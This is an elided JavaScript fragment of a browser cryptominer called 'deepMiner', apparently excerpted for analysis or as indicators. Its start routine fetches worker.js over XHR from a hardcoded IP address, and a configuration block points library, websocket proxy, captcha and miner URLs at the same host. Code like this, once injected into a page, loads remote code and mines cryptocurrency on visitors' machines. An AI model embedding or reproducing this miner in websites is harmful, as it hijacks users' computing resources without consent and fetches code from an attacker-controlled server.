(function (window) {
    ...
    Miner.prototype.start = function (mode) {
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.open("get", "http://191.232.179.253/worker.js", true);
            xhr.send()
...
self.deepMiner.CONFIG = {
    LIB_URL: "http://191.232.179.253/lib/",
    WEBSOCKET_SHARDS: [["ws://191.232.179.253/proxy"]],
    CAPTCHA_URL: "http://191.232.179.253/captcha/",
    MINER_URL: "http://191.232.179.253/media/miner.html"
};
